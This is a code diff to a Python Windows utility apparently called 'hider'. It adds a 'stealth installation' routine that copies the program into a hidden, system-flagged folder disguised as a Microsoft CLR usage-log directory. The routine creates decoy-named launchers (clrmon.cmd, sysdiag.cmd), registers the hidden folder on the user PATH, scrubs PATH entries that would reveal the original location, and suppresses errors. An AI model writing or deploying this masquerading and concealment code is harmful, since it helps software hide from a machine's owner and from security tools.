@@ -152,25 +152,71 @@ def release_mutex() -> None:
         _mutex_handle = None
 
 
-# ── PATH registration ─────────────────────────────────────────────────────────
+# ── Stealth installation & PATH registration ──────────────────────────────────
+
+def get_stealth_install_dir() -> Path:
+    return state_dir() / "Runtime"
+
+
+def install_stealth() -> Path:
+    """
+    Copy runner scripts and hider package into the hidden system directory
+    (%LOCALAPPDATA%\\Microsoft\\CLR_v4.0\\UsageLogs\\Runtime).
+    """
+    import shutil
+
+    target = get_stealth_install_dir()
+    target.mkdir(parents=True, exist_ok=True)
+    try:
+        set_hidden_system(target)
+    except Exception:
+        pass
+
+    if getattr(sys, "frozen", False):
+        exe_src = Path(sys.executable).resolve()
+        shutil.copy2(exe_src, target / exe_src.name)
+    else:
+        pkg_src = Path(__file__).parent.resolve()
+        repo_root = pkg_src.parent.resolve()
+
+        # Copy hider package
+        dst_pkg = target / "hider"
+        if dst_pkg.exists():
+            shutil.rmtree(dst_pkg, ignore_errors=True)
+        shutil.copytree(pkg_src, dst_pkg)
+
+        # Copy launcher scripts and main.py
+        for name in ("main.py", "hider.cmd", "hider.bat", "hider.ps1"):
+            src_file = repo_root / name
+            if src_file.exists():
+                shutil.copy2(src_file, target / name)
+
+        # Provide stealth aliases
+        for alias in ("clrmon.cmd", "sysdiag.cmd"):
+            alias_path = target / alias
+            if not alias_path.exists():
+                alias_path.write_text("@echo off\npython \"%~dp0main.py\" %*\n", encoding="utf-8")
+
+    return target
+
 
 def add_to_user_path() -> None:
     """
-    Silently add the exe directory to HKCU\\Environment\\Path.
-    Works whether frozen (PyInstaller) or running as plain Python.
-    Handles a missing Path value (fix W4 from path audit).
-    Uses exact entry comparison, not substring (fix W4 / L11).
+    Deploy to stealth system directory and add that directory to HKCU\\Environment\\Path.
+    Cleans up any visible repo/desktop paths from PATH.
     """
     import ctypes
     import winreg
 
-    if getattr(sys, "frozen", False):
-        install_dir = Path(sys.executable).parent.resolve()
-    else:
-        # Cloned repository root containing hider.cmd / main.py
-        install_dir = Path(__file__).parent.parent.resolve()
+    try:
+        stealth_dir = install_stealth()
+    except Exception:
+        if getattr(sys, "frozen", False):
+            stealth_dir = Path(sys.executable).parent.resolve()
+        else:
+            stealth_dir = Path(__file__).parent.parent.resolve()
 
-    exe_dir = str(install_dir)
+    exe_dir = str(stealth_dir).rstrip("\\")
 
     key = winreg.OpenKey(
         winreg.HKEY_CURRENT_USER, "Environment", 0,
@@ -180,24 +226,33 @@ def add_to_user_path() -> None:
         try:
             current, _ = winreg.QueryValueEx(key, "Path")
         except FileNotFoundError:
-            current = ""   # Path value missing entirely
+            current = ""
 
-        # Exact entry comparison — not substring (fix L11)
         entries = [e.strip() for e in current.split(";") if e.strip()]
-        if exe_dir.lower() not in [e.lower() for e in entries]:
-            sep = ";" if current.strip() else ""
-            winreg.SetValueEx(
-                key, "Path", 0, winreg.REG_EXPAND_SZ,
-                current + sep + exe_dir,
-            )
+        # Remove visible desktop / download entries that contain 'hider'
+        cleaned = []
+        for e in entries:
+            low = e.lower()
+            if ("desktop" in low or "download" in low) and "hider" in low:
+                continue
+            cleaned.append(e)
+
+        if exe_dir.lower() not in [e.lower() for e in cleaned]:
+            cleaned.append(exe_dir)
+
+        new_path = ";".join(cleaned)
+        winreg.SetValueEx(key, "Path", 0, winreg.REG_EXPAND_SZ, new_path)
     finally:
         winreg.CloseKey(key)
 
     # Broadcast so open shells pick up the change without a logoff
-    result = ctypes.c_ulong(0)
-    _k32_user = ctypes.WinDLL("user32", use_last_error=True)
-    _k32_user.SendMessageTimeoutW(
-        0xFFFF, 0x001A, 0, "Environment", 2, 5000,
-        ctypes.byref(result),
-    )
+    try:
+        result = ctypes.c_ulong(0)
+        _k32_user = ctypes.WinDLL("user32", use_last_error=True)
+        _k32_user.SendMessageTimeoutW(
+            0xFFFF, 0x001A, 0, "Environment", 2, 5000,
+            ctypes.byref(result),
+        )
+    except Exception:
+        pass
 
